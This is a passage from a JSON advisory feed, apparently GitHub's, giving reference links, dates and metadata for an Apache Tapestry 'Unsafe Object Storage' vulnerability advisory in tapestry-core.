href=\"http://seclists.org/fulldisclosure/2019/Aug/20\">http://seclists.org/fulldisclosure/2019/Aug/20</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2019/08/23/5\">http://www.openwall.com/lists/oss-security/2019/08/23/5</a></li>\n<li><a href=\"https://github.com/apache/tapestry-5/commit/5ad5257fdfacbad2c7c480fdf2afa15d9a37e6b0\">https://github.com/apache/tapestry-5/commit/5ad5257fdfacbad2c7c480fdf2afa15d9a37e6b0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c438-8cvq-pxxx\">https://github.com/advisories/GHSA-c438-8cvq-pxxx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c438-8cvq-pxxx",
            "title": "[org.apache.tapestry:tapestry-core] Apache Tapestry Unsafe Object Storage",
            "date_modified": "2023-08-07T20:22:30.000Z",
            "date_published": "2022-05-13T01:26:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c438-8cvq-pxxx"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}